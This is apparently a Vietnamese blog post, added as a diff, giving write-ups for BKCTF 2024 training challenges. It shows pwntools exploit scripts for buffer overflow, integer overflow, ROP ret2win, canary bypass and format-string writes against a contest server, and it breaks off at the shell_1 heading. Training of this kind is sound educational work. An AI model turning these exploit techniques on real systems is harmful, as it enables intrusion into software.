@@ -1,0 +1,1095 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>BKCTF 2024 Training</title>
+  <meta name="description" content="Table of Content  0x00 Lời chào  0x01 Pwnable          Buffalow      index_1      int_1      Rộp Rộp Rộp      pwn3      Raising the hero      shell_1        ...">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/2024/03/04/BKCTF-Train.html">
+  <link rel="alternate" type="application/rss+xml" title="George Do" href="http://localhost:4000/feed.xml">
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>BKCTF 2024 Training | George Do</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="BKCTF 2024 Training" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Table of Content 0x00 Lời chào 0x01 Pwnable Buffalow index_1 int_1 Rộp Rộp Rộp pwn3 Raising the hero shell_1 0x02 Crypto B64 Recovery Lời chào" />
+<meta property="og:description" content="Table of Content 0x00 Lời chào 0x01 Pwnable Buffalow index_1 int_1 Rộp Rộp Rộp pwn3 Raising the hero shell_1 0x02 Crypto B64 Recovery Lời chào" />
+<link rel="canonical" href="http://localhost:4000/2024/03/04/BKCTF-Train.html" />
+<meta property="og:url" content="http://localhost:4000/2024/03/04/BKCTF-Train.html" />
+<meta property="og:site_name" content="George Do" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-03-04T00:00:00+07:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="BKCTF 2024 Training" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-03-04T00:00:00+07:00","datePublished":"2024-03-04T00:00:00+07:00","description":"Table of Content 0x00 Lời chào 0x01 Pwnable Buffalow index_1 int_1 Rộp Rộp Rộp pwn3 Raising the hero shell_1 0x02 Crypto B64 Recovery Lời chào","headline":"BKCTF 2024 Training","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2024/03/04/BKCTF-Train.html"},"url":"http://localhost:4000/2024/03/04/BKCTF-Train.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">George Do</a>
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg viewBox="0 0 18 15">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+
+      <div class="trigger">
+        
+          
+        
+          
+        
+          
+          <a class="page-link" href="/list100/">List 100</a>
+          
+        
+          
+        
+          
+          <a class="page-link" href="/note.html">Notes</a>
+          
+        
+          
+          <a class="page-link" href="/post/">Post</a>
+          
+        
+          
+        
+      </div>
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      inlineMath: [['$','$']], 
+    }
+  });
+</script>
+
+<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
+
+<script>
+  /**
+  *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+  *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables    */
+  
+  var disqus_config = function () {
+  this.page.url = page.url ;  // Replace PAGE_URL with your page's canonical URL variable
+  this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+  };
+  
+  (function() { // DON'T EDIT BELOW THIS LINE
+  var d = document, s = d.createElement('script');
+  s.src = 'https://https-geordo-github-io.disqus.com/embed.js';
+  s.setAttribute('data-timestamp', +new Date());
+  (d.head || d.body).appendChild(s);
+  })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">BKCTF 2024 Training</h1>
+    <p class="post-meta"><time datetime="2024-03-04T00:00:00+07:00" itemprop="datePublished">Mar 4, 2024</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <h2 id="table-of-content">
+  
+  
+    Table of Content <a href="#table-of-content">#</a>
+  
+  
+</h2>
+    
+<ul>
+  <li><a href="#lời-chào">0x00 Lời chào</a></li>
+  <li><a href="#pwnable">0x01 Pwnable</a>
+    <ul>
+      <li><a href="#bài-buffalow">Buffalow</a></li>
+      <li><a href="#bài-index_1">index_1</a></li>
+      <li><a href="#bài-int_1">int_1</a></li>
+      <li><a href="#bài-rộp-rộp-rộp">Rộp Rộp Rộp</a></li>
+      <li><a href="#bài-pwn3">pwn3</a></li>
+      <li><a href="#bài-raising-the-hero">Raising the hero</a></li>
+      <li><a href="#bài-shell_1">shell_1</a></li>
+    </ul>
+  </li>
+  <li><a href="#crypto">0x02 Crypto</a>
+    <ul>
+      <li><a href="#bài-b64-recovery">B64 Recovery</a></li>
+    </ul>
+  </li>
+</ul>
+<h2 id="lời-chào">
+  
+  
+    Lời chào <a href="#lời-chào">#</a>
+  
+  
+</h2>
+    
+
+<p style="text-align: center;"><img src="/images/bktrain2024/imagee.png" alt="Smile" /></p>
+
+<p>Đã từ lâu, tôi không viết bài ctf mới trên blog, một phần vì chưa có chủ đề nào tôi cảm thấy thú vị để viết, phần còn lại là do quỹ thời gian của tôi gần đây không có nhiều. Khởi động năm mới 2024 với giải training của trường ĐHBKHN, độ khó của các bài chỉ ở tầm dễ, trung bình, vì vậy tôi cũng tự tin hơn.</p>
+<h2 id="pwnable">
+  
+  
+    Pwnable <a href="#pwnable">#</a>
+  
+  
+</h2>
+    
+<h3 id="bài-buffalow">
+  
+  
+    Bài Buffalow <a href="#bài-buffalow">#</a>
+  
+  
+</h3>
+    
+
+<p>Đề bài cho chúng ta source code, đây là một bài BOF cơ bản</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">flag</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">50</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Enter your favorite number: "</span><span class="p">);</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">flag</span> <span class="o">==</span> <span class="mh">0x13141516</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
+        <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+        <span class="n">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">flag</span><span class="p">),</span> <span class="n">fp</span><span class="p">);</span>   
+        <span class="n">puts</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Hỗ hổng nằm ở hàm <code class="language-plaintext highlighter-rouge">fgets</code> với việc cho nhập 100 bytes vào mảng <code class="language-plaintext highlighter-rouge">buf</code> có kích thước 50 bytes. Vì vậy, chúng ta có thể thay đổi giá trị biến <code class="language-plaintext highlighter-rouge">flag</code> từ 0xDEADBEEF thành 0x13141516 dựa vào lỗ hổng này.</p>
+
+<p>Quan sát trong IDA, chúng ta dễ dàng tính ra được số bytes cần phải lấp đầy mảng <code class="language-plaintext highlighter-rouge">buf</code> được khi ghi đè giá trị biến <code class="language-plaintext highlighter-rouge">flag</code> là 0x50-0x4 = 76 (bytes)</p>
+
+<p><img src="/images/bktrain2024/image.png" alt="alt text" /></p>
+
+<p><strong>Lời giải</strong></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./bof_1</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6001</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="o">*</span><span class="mi">76</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x13141516</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">number: </span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><strong>Đáp án: BKSEC{\xBuffer\xOv3rfl0w\x1s\xchiLL}</strong></p>
+<h3 id="bài-index_1">
+  
+  
+    Bài index_1 <a href="#bài-index_1">#</a>
+  
+  
+</h3>
+    
+
+<p>Đây là một chương trình mua bán các vật phẩm. Với dạng bài này, các lỗ hổng như chuyển tiền âm, mua số lượng sản phẩm âm, … rất dễ xảy ra nếu không được kiểm tra kỹ càng.</p>
+
+<p>Load file vào IDA, sau khi phân tích một chút, chúng ta cần quan tâm tới 2 đoạn mã sau đây</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">6</span> <span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">money</span> <span class="o">&gt;</span> <span class="mh">0x64</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+<span class="nl">LABEL_x409:</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Insufficient funds. You cannot afford this item."</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Với số tiền ban đầu là <code class="language-plaintext highlighter-rouge">money = 0x64</code>, chúng ta sẽ có được shell nếu như số tiền <code class="language-plaintext highlighter-rouge">money &gt; 0x64</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span> <span class="n">option</span> <span class="o">&lt;=</span> <span class="mi">6</span> <span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">price</span> <span class="o">=</span> <span class="n">HIDWORD</span><span class="p">(</span><span class="n">v9</span><span class="p">[</span><span class="mi">7</span> <span class="o">*</span> <span class="n">option</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]);</span>
+    <span class="n">total</span> <span class="o">=</span> <span class="n">price</span> <span class="o">*</span> <span class="n">num</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">price</span> <span class="o">*</span> <span class="n">num</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">money</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">goto</span> <span class="n">LABEL_x409</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">money</span> <span class="o">-=</span> <span class="n">total</span><span class="p">;</span>
+    <span class="p">[...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Với đoạn code này, khi mua vật phẩm, số tiền chúng ta sẽ bị trừ đi. Ở đây không có kiểm tra số lượng vật phẩm mua, vì vậy chúng ta sẽ mua số vật phẩm &lt; 0.</p>
+
+<p><img src="/images/bktrain2024/image-1.png" alt="alt text" /></p>
+
+<p><strong>Đáp án: BKSEC{YOU_SHOULD_buY_f1A9_iN5TE4d_0F_p@PC@i1}</strong></p>
+<h3 id="bài-int_1">
+  
+  
+    Bài int_1 <a href="#bài-int_1">#</a>
+  
+  
+</h3>
+    
+
+<p>Load file vào IDA, ta thấy chương trình cho nhập 2 số nguyên dương. Nếu tổng của chúng &lt; 0, ta sẽ có được shell. Đây là lỗ hổng IOF (tràn số nguyên), ta chỉ cần nhập max giá trị của kiểu dữ liệu int cho số đầu tiên và số còn lại với giá trị nguyên dương bất kỳ.</p>
+
+<p><img src="/images/bktrain2024/image-7.png" alt="alt text" /></p>
+
+<p><strong>Lời giải</strong></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3 
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6051</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">number: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">2147483647</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">number: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">10</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><strong>Đáp án: BKSEC{Ma7h_1s_7hE_woR57_thIn6_EveR}</strong></p>
+<h3 id="bài-rộp-rộp-rộp">
+  
+  
+    Bài Rộp Rộp Rộp <a href="#bài-rộp-rộp-rộp">#</a>
+  
+  
+</h3>
+    
+
+<p>Load file đã cho vào IDA, ta thấy được lỗ hổng ở hàm <code class="language-plaintext highlighter-rouge">fgets()</code> với việc cho phép nhập 0x100 bytes cho mảng <code class="language-plaintext highlighter-rouge">buf</code> có kích thước 8 bytes. (Ở đây tôi không chắc <code class="language-plaintext highlighter-rouge">buf</code> có kích thước 8 bytes vì IDA phân tích ra như vậy. Nhưng tôi chắc chắn có lỗi BOF do <code class="language-plaintext highlighter-rouge">buf</code> được bắt đầu từ [rbp-0x40])</p>
+
+<p><img src="/images/bktrain2024/image-3.png" alt="alt text" /></p>
+
+<p>Quay lại bài toán, đây là dạng bài <code class="language-plaintext highlighter-rouge">ret2win</code> với hàm <code class="language-plaintext highlighter-rouge">win()</code> được thiết kế như sau</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">win</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a2</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">a1</span> <span class="o">!=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xDEADBEEFDEADBEEFLL</span> <span class="o">||</span> <span class="n">a2</span> <span class="o">!=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xDEADBEEFDEADBEEFLL</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"!!! Access denied"</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Entered param1: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a1</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Entered param2: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a2</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Dễ thấy chỉ cần <code class="language-plaintext highlighter-rouge">a1 = a2 = 0xDEADBEEFDEADBEEF</code> thì chúng ta sẽ lấy được shell. Sử dụng gdb, ta thấy giá trị 2 thanh ghi <code class="language-plaintext highlighter-rouge">rdi</code> và <code class="language-plaintext highlighter-rouge">rsi</code> được so sánh với 0xDEADBEEFDEADBEEF. Từ đây, chúng ta cần tìm các ROP-Gadget để kiểm soát giá trị cho 2 thanh ghi này. Nhiệm vụ này cũng chính là tên của bài toán “Rộp”.</p>
+
+<p><img src="/images/bktrain2024/image-4.png" alt="alt text" /></p>
+
+<p><strong>Lời giải</strong></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./bof_2</span><span class="sh">"</span><span class="p">)</span>
+<span class="c1"># p = process(elf.path) 
+</span><span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6011</span><span class="p">)</span>
+
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x00000000004011e5</span>
+<span class="n">pop_rsi</span> <span class="o">=</span> <span class="mh">0x00000000004011ee</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x000000000040101a</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x48</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">"</span><span class="s">win</span><span class="sh">"</span><span class="p">])</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">number: </span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><strong>Đáp án: BKSEC{2–&gt;\xupgrade\xBuffer\xOv3rfl0w\x1s\xn0t\xchiLL\xhixxxxxxxxxxxxxx}</strong></p>
+<h3 id="bài-pwn3">
+  
+  
+    Bài pwn3 <a href="#bài-pwn3">#</a>
+  
+  
+</h3>
+    
+
+<p>Về cơ bản, ý tưởng giải bài này y hệt bài phía trên. Chỉ khác ở bài này có thêm cờ canary được bật.</p>
+
+<p><strong>Lời giải</strong></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./bof_3</span><span class="sh">"</span><span class="p">)</span>
+<span class="c1"># p = process("./bof_3")
+</span><span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6021</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">is: </span><span class="sh">'</span><span class="p">)</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">strip</span><span class="p">().</span><span class="nf">decode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">canary</span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
+
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x0000000000401205</span>
+<span class="n">pop_rsi</span> <span class="o">=</span> <span class="mh">0x000000000040120e</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x0000000000401398</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x58</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">"</span><span class="s">win</span><span class="sh">"</span><span class="p">])</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">number: </span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><strong>Đáp án: BKSEC{W3_4LL_Hat3_c4NARY}</strong></p>
+<h3 id="bài-raising-the-hero">
+  
+  
+    Bài Raising the hero <a href="#bài-raising-the-hero">#</a>
+  
+  
+</h3>
+    
+
+<p>Kiểm tra các lớp bảo vệ của file</p>
+<blockquote>
+  <p>Canary                        : ✓
+    NX                            : ✓
+    PIE                           : ✘
+    Fortify                       : ✘
+    RelRO                         : ✘</p>
+</blockquote>
+
+<p>Load chương trình vào IDA32, chúng ta thấy có lỗ hổng FMT ở dòng <code class="language-plaintext highlighter-rouge">printbuffer(buf)</code>.</p>
+
+<p><img src="/images/bktrain2024/image-5.png" alt="alt text" /></p>
+
+<p>Đây là dạng bài <code class="language-plaintext highlighter-rouge">ret2win</code>, chúng ta chỉ cần thay đổi giá trị <code class="language-plaintext highlighter-rouge">target = 0x6F726568</code> sẽ có được shell.</p>
+
+<p><strong>Lời giải</strong></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./fmt_1</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6101</span><span class="p">)</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="mh">0x0804B39C</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="mh">0x6568</span><span class="si">}</span><span class="s">c%23$n</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="mh">0x6F72</span> <span class="o">-</span> <span class="mh">0x6568</span><span class="si">}</span><span class="s">c%24$n</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">P</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">say?</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Phân tích một chút về lời giải trên. Do PIE tắt nên địa chỉ biến <code class="language-plaintext highlighter-rouge">target</code> không thay đổi. Chúng ta cần quan sát và đếm trên stack để biết được chính xác vị trí của <code class="language-plaintext highlighter-rouge">target</code>.</p>
+
+<p>Để gán cho <code class="language-plaintext highlighter-rouge">target = 0x6F726568</code>, ta phải chia ra làm 2 phần, vì khi truyền 0x6F726568 kí tự cho <code class="language-plaintext highlighter-rouge">target</code> thì sẽ quá lâu. Vì vậy, ta sẽ gán 0x6568 cho <code class="language-plaintext highlighter-rouge">target</code> và 0x6F72 cho <code class="language-plaintext highlighter-rouge">target+2</code>. Lưu ý rằng, <code class="language-plaintext highlighter-rouge">$n</code> đếm số byte ở trước đó được ghi, vậy nên khi gán giá trị cho <code class="language-plaintext highlighter-rouge">target+2</code>, chúng ta chỉ cần gán 0x6F72 - 0x6568 (bytes) mà thôi.</p>
+
+<p><strong>Đáp án: BKSEC{R41s1ng_th3_H3rO}</strong></p>
+
+<p><strong>Tham khảo:</strong></p>
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=uet1ixUN8Gg">Bài 16: Format String - Ghi dữ liệu bằng %n</a></li>
+</ul>
+<h3 id="bài-shell_1">
+  
+  
+    Bài shell_1 <a href="#bài-shell_1">#</a>
+  
+  
+</h3>
+    
+
